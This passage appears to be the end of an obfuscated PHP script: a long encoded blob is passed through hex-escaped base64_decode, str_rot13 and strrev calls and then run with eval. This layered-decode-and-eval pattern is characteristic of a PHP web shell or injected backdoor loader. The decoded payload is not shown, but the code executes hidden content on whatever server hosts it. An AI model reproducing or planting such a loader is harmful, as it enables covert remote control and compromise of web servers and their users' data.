tNPVtNPVtNvPX0UVtNPVtNPVtbjBzSwMkLJZwNvBl9ToiAJYx5JqiW3MeAJLvOPVtNPVtNPVtNPV tbjrt42ocEUpiOPVtNPVtNPVXbDstNPVtNPVtNvP7VKM05JniOUV6V3omWKqwOPVtNPVtNPVtNPV tbjrtVKM0MJL6D3LykJMmOPVtNPVtNPVXbDstNPVtNPVtNvP7LzMzMzMzAPV6V3of92LtNPVtNPV tNPVtNPVXfQqhIzpuO3phSzp0OvBl9ToiAJYx5JqiW3MeAJLvOPVtNPVtNPVtNPVtbjrtD3LykJM mOPVtNPVtNPVXbtPX0UVtNPVtNPVtbjB4OKAtbmp1yTMuWKYlITMl9zLtNPVtNPVtNPVtNPVXfQr jIQV6ZKqcEJLl1vpyEzpiWJY0y2nvI2qgNPVtNPVtNPVtNPVtbjB4OKAtbmp1yTMuWKYlITMl9zL gb3og1PVtNPVtNPVtNPVtNvP7DJnf92ptNQZjNQZjZPV4OKZtbwpyEzpiWTVtNPVtNPVtNPVtNvP 7OFLyWKL0uKM0OPVtNPVtNPVXjPqwIToyAUVtNPVtNPVtbNY0IUphyTVtNPVtNPVtbtP9OPVtNPV tNPVXfwMzMzMzM2VttUpjRQV4OUZttUpjNvB39TMuu2pgDUryEUVtNPVtNPVtNPVtNvP7DToiqTV 6V3of92LtNPVtNPVtNPVtNPVXfUVlIzqiuzBuOPVtNPVtNPVXbDstNPVtNPVtNvP7Hzoi5TV642o cEKLl92LyEJY0uKM0OPVtNPVtNPVtNPVtbjBzMzMzMzMwNvBl9ToiATVtNPVtNPVtNPVtNvP7OFL tNPVtNPVtNvPX0UVtNPVtNPVtbjB5SzpaOPMck2omOPrjAQV6VKMxW3ovOPVtNPVtNPVtNPVtbjB zSwMkLJZwNvBl9ToiAJYx5JqiW3MeAJLvOPVtNPVtNPVtNPVtbjrtVJo1uTqgVKLvkToiW3Lm1Pq cgzLyqKY6bGrx9zLtNPVtNPVtNvPX0UVtNPVtNPVtbjBzSwMkLJZwNvBx5JqiW3MeAJLvOPVtNPV tNPVtNPVtbjrtf2LuWUqgVKLvkToiW3Lm1PqcgzLyqKY6bGrx9zLtNPVtNPVtNvPX0UVtNPVtNPV tbjB4OaZkNvBbEUMcqUVtNPVtNPVtNPVtNvP7OvpuWTof9zpwAKY0y2nvI2qgbwB5E2ovOPVtNPV tNPVXbDstNPVtNPVtNvP7LJZzSwMkZPV6V3of92LgDzo19zpag2LuWTVtNPVtNPVtNPVtNvP7HmA 1pGA3ZPV4OKZttUpjNPrjOQV6p3oxSTnm1Pq4ITqtNPVtNPVtNPVtNPVXfGM2y2plI3LtjvVmy2p iExVtbGrfyJouMJY052ozOPVtNPVtNPVtNPVtbjrtxUMiWTVtNPVtNPVtbtP9OPVtNPVtNPVXfGM yqzo1WRV6xUoc1JLz1Pqh9zMtNPVtNPVtNPVtNPVXfUVykTqcEaYtNPVtNPVtNvPX0UVtNPVtNPV tbjB05JL0W3oj1JnuNPrjMGZtbGM6y2pgDaoiMTVtNPVtNPVtNPVtNvP7OFLtNPVtNPVtNvPf4JL jAUVtNPVtNPVtbNYjOPVtNPVtNPVXbDstNPVtNPVtNvP9OPVtNPVtNPVtNPVtbjB39TofIJrttUp jRQV4OUZk0PV4OUAtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPrjIQV4OKAgNPrjWGYtNPV tNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPrjIQVjNPZtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3o fkJM5OPZtNQVjNPVtNPVtNPVtNPVtNPVtNPVtNPVXjFMa5JLl9TV4OUZkNPZtNQVtNPVtNPVtNPV tNPVtNPVtNPVtbNYxIzpttUpjVQVjNPZtjPMyWUV4OUZlNPrjAQVjNvB39TMuu2pgDUryEUVtNPV tNPVtNPVtNPVtNPVXfUVyNQZkNPVtNPVtNPVtNPVtbtP9OPVtNPVtNPVtNPVtbDXjNPYjNPY1HwZ tjFA1VQXuW2MlOPrjOQAttUp1VGYttUpjNPVtNPVtNPVtNPVtNPVtNPVtNPVXjFX14PZtjPZtjFA 1VQVfHGAltFLvqzpttUpjZQV4OUZl0PV4OaZtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPr jOGZttUpjRGYttUp00PVtNPVtNPVtNPVtNPVtNPVtNPVtbNY39TofIJrttUp1NPrjIGYttUpmNPV tNPVtNPVtNPVtNPVtNPVtNPVXjFMa5JLl9TV4OUZkNPrjIGYtNQVtNPVtNPVtNPVtNPVtNPVtNPV tbNYxIzpttUpjVQVjNPZtjPMyWUV4OUZlNPrjAQVjNvB39TMuu2pgDUryEUVtNPVtNPVtNPVtNPV tNPVXfUVyHmAtNPVtNPVtNPVtNPVXbDstNPVtNPVtNPVtNPVXfGX14PZtjPZtjFA1VQVfHGAltFL vqzpttUpjZQV4OUZl0PV4OaZtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPrjOwZttUp1RGY ttUp00PVtNPVtNPVtNPVtNPVtNPVtNPVtbNY39TofIJrttUpjRQV4OUZk0PV4O3ZtNPVtNPVtNPV tNPVtNPVtNPVtNvPfp3ofkJM5OPrjIQV4OKAgNPrjWGYtNPVtNPVtNPVtNPVtNPVtNPVtNvPfH2M hSzpiOPrjOGZttUp10PVjNPVtNPVtNPVtNPVtNPVtNPVtNPVXjPMyWUV4OUZlNPZtNQVfDJMlOPr jOwZttUpmNPZtbmqiEJLbAKY0uKM0OPVtNPVtNPVtNPVtNPVtNvP7OFWjHQVtNPVtNPVtNPVtNvP X0UVtNPVtNPVtNPVtNvP7p3ofkJM5OPrjOwZttUp1RGYttUp00PVtNPVtNPVtNPVtNPVtNPVtNPV tbNY39TofIJrttUpjRQV4OUZk0PV4O3ZtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPrjIQV 4OKAgNPrjWGYtNPVtNPVtNPVtNPVtNPVtNPVtNvPfp3ofkJM5OPrjIQVjNPZtNPVtNPVtNPVtNPV tNPVtNPVtNvPfH2MhSzpiOPrjOwZtNQVjNPVtNPVtNPVtNPVtNPVtNPVtNPVXjPMyWUV4OUZmNPZ tNQVfDJMlOPrjOwZttUpmNPZtbmqiEJLbAKY0uKM0OPVtNPVtNPVtNPVtNPVtNvP7OFW1VQVtNPV tNPVtNPVtNvPX0UVtNPVtNPVtNPVtNvP7p3ofkJM5OPrjOGZttUpjRGYttUp0NPVtNPVtNPVtNPV tNPVtNPVtNPVXjlqikToyyUV4OKAttUp10PV4OaZgNPVtNPVtNPVtNPVtNPVtNPVtNPVXjlqikTo yyUV4OKAtNQVjNPVtNPVtNPVtNPVtNPVtNPVtNPVXjlqikToyyUVjNPZtNQVtNPVtNPVtNPVtNPV tNPVtNPVtbNYyqzouW3ottUpjRQVjNPZtNPVtNPVtNPVtNPVtNPVtNPVtNvPfDJMlOPrjOwZtNQV jNPYxIzpttUpjVQV4O3ZtNQV6p3oxSTnm1Pq4ITqtNPVtNPVtNPVtNPVtNPVtbjrtHPZtNPVtNPV tNPVtNPVXfUVa5Jn6SToPOlpy1JLlMJrygTDtNPVtNPVtNvPX0UVtNPVtNPVtbjBlSJMhyTotHTq u5zpyEUouOFM0yzocMzocOlMhyzrukzDtZaZtbwoiyTqu1JnhSTVtNPVtNPVtNPVtNvP7p3ofkJM 5OPrjOmZttUpjRGYtNQVtNPVtNPVtNPVtNPVtNPVXjlqikToyyUV4OUZkNPrjOGZgNPrjEGYtNPV tNPVtNPVtNPVtNPVtbNY39TofIJrttUp2NPrjIGYttUp0NPVtNPVtNPVtNPVtNPVtNvPfH2MhSzp iOPrjOGZtNQVjNPVtNPVtNPVtNPVtNPVtNvPfDJMlOPrjOwZtNQVjNPVtNPVtNPVtNPVtNPVtNvP fDJMlOPrjOwZttUpmNPZtNPVtNPVtNPVtNPVtNPVtbtB39TMuu2pgDUryEUVtNPVtNPVtNPVtNvP XfGMfETMc1TV642MckJLgjJLwyTqlIzqtNPVtNPVtNPVtNPVXfGMh9zotbGMhyTo0I3otNPVtNPV tNPVtNPVXfQrjOGAtbQn0EJn31voc1TVtNPVtNPVtNPVtNvP7tUpjHQV6DUnayJMb1FMhyTotNPV tNPVtNPVtNPVXfQrjOQZkNvBycKnm1Pqh9zMtNPVtNPVtNPVtNPVXfGXjNPY1RGZtjFA1VQXvqzp tbwpik2owOPVtNPVtNPVtNPVtbtP7NQV64JnaWKLgOPVtNPVtNPVtNPVtbjBeA2ofWJYy5Jnf5Jn tbGrukTpmyTMtNPVtNPVtNPVtNPVXfUVa5Jn6SToP5PVtNPVtNPVtbtP9OPVtNPVtNPVXfGMfETM c1TV642MckJLgjJLwyTqlIzqtNPVtNPVtNPVtNPVXfGWjNGZtbQqbqJnyuTVtNPVtNPVtNPVtNvP 7f2LikzLgHzockzocOvB5STojAKnxOPVtNPVtNPVtNPVtbjBapPV6DaoyEaoiATVtNPVtNPVtNPV tNvP7OFMl9zMyWzByWKnz5PVtNPVtNPVtbtP9OPVtNPVtNPVXbjBykTMxyJotbwoayTou1PouAJn 0WKM2OPVtNPVtNPVtNPVtbjBlITqhI2LtbwoayTou1Pq4ITqtNPVtNPVtNPVtNPVXfwoyETMcuTV 6p3ofMzpyM3otNPVtNPVtNPVtNPVXfmWgyzoiW3nOqPV6xUoc1JLz1Pqh9zMtNPVtNPVtNPVtNPV XfQrjOGZtbmp1yTMuWKYlITMl9zLtNPVtNPVtNPVtNPVXfQrjOQZlNPrjOQZjRQV6HzrcAKYx5Jq iW3MeAJLvOPVtNPVtNPVtNPVtbjBlITqhI2LtVKM05JMwOvBh9Jn0y2piOKYx5JqiW3MeAJLvOPV tNPVtNPVtNPVtbtP7tUpjNwZtbQqbqJnyuTVtNPVtNPVtNPVtNvP7tUpjNQZkNvBbEUMcqKY4SJo tNPVtNPVtNPVtNPVXfGWjtQV6tTqxy2qtNPVtNPVtNPVtNPVXfmo0IKLttUpjHQV64JnaWKLgOPV tNPVtNPVtNPVtbjrtHzpcMzYtNPVtNPVtNvPXbjBcpFoc52olgJD9xUoc1JLz9mpmA2Yg92LhZKn jSJMfq2oiqzYmEaoiM2YibmpjEUqbqPXfWKqtDapiOKocORVtNPVtNPVtbjBcplpcA3oR1GrfyJo uM2CmA3Li02ow5lpcOKLyk2Mi92MhZUqh9zMi8vBmOUq0u2Wbjzp1OPql9TpgyTDtNPVtNPVtNvP +HTo5E3p8NPVtNvP+8PVvVKMlWKMzIzpg8zov0GrwyToiOapyWapyMJMlOvVmI3ogyaoi5JLv0wo cqJnl92pm9zpwOvV90GHhS2pcMyrkR1oGcJrSu0FUqHqGW2Yec2Ec90L35JMeHRp5I0oEIzMmEHD muUZ0HRojZ0pJczJR9FpO5xHEk2Mwu3piAHIwO3XEcKqzOUoIqSrlkzrG1vZkHGLbAaV9xUqcW3M yEaocOvVmA3Lh4Jng5PofS2YmA3LiNwYm4vAiHJoiAKM3SJY052oz9lpvyToitKLdS2Yg92LhHzp ukzMxI3ofAzYmczoxA2YibmpjEUqbWFCzIzpbOvV0IJMbAKMfyUqmWFCfIzptfzockTCtNPVtbtC vZKqi1Jrh9zouWFChy2McW3omA3olATVvD0M2bzAOEHowqmqeMHLkx0oUqHE2VJB1VaFiZQonSwo WqwL2N3GEE3nGqIGJ92ZCMQoZcSMPSxHcuGHHkTnZqHY0tmZuu2pv0Gr0yzpaITqhyTVvDKMyu2p ykJr0AaV9jJMlOvVmA3Lh4Jng5PpuWUqmE3oiW2YmA3LiD3pcE2YkRTnjkJLgNwYm4FANOKLlE3p 092ov9Foj52Y0IzohVaqckJMxAanh4TMw9lY6ZUp0EUnv0wMyWUntfzockTCtNPVtbtCykTqcE3Y 8tIEgVIMeSJMZ50ocqJMZ5GMfEKn0kQVtNPVX4wVj4FZ9HTouA2pgjJLcEKnhyTVftTqxy2qgH2L cMKMx1Qn0EJn3WFC05JM052owOvV0W3ojqKMcMaV9HJou5TVuEKMgkQVtNPVX4wVyqTMy1GEWWFC 05JM052owOvVykzLcEKLj12oQ1FDI1PJv0wqcIKpy1Pp0EUntRTqy1TCtNPVtbtCvtGYTEIIv0Qq yAapuu2LtRTqy1TCtNPVtbtCxSJMbkwPX4wVhIzV9pzoukTVf1TqbkwP+jJo0uTVSOIJHA0GRSPC";

$_ = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65"; 
$__ = "\x73\x74\x72\x5f\x72\x6f\x74\x31\x33"; 
$___ = "\x73\x74\x72\x72\x65\x76";  

eval("?>" . ${"\x5F"}(${"\x5F\x5F"}(${"\x5F\x5F\x5F"}(${"\x5F"}(($txt))))));
